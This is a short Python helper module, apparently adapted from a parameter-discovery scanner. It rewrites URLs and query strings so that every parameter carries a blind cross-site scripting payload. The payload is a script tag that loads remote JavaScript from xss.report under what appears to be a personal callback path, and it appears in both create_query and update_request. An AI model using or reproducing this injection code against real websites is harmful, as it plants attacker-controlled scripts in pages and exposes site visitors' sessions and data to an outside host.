import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.importer import importer


def create_query(params):
    """
    creates a query string from a list of parameters
    returns str
    """
    query_string = ''
    for param in params:
        pair = param + '=' + '\'"><script src=https://xss.report/c/dalaho></script>' + '&'
        query_string += pair
    if query_string.endswith('&'):
        query_string = query_string[:-1]
    return  query_string



def update_request(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    for q in query_params:
        query_params[q]=['\'"><script src=https://xss.report/c/dalaho></script>']

    encoded_query = urlencode(query_params, doseq=True)
    new_url = urlunparse((
    parsed_url.scheme,
    parsed_url.netloc,
    parsed_url.path,
    parsed_url.params,
    encoded_query,
    parsed_url.fragment
    ))
    return new_url

    


def extract_js(response):
    """
    extracts javascript from a given string
    """
    scripts = []
    for part in re.split('(?i)<script[> ]', response):
        actual_parts = re.split('(?i)</script>', part, maxsplit=2)
        if len(actual_parts) > 1:
            scripts.append(actual_parts[0])
    return scripts


def prepare_requests(args):
    """
    creates a list of request objects used by Arjun from targets given by user
    returns list (of targs)
    """
 
    if args.import_file:
        return importer(args.import_file)
    return []

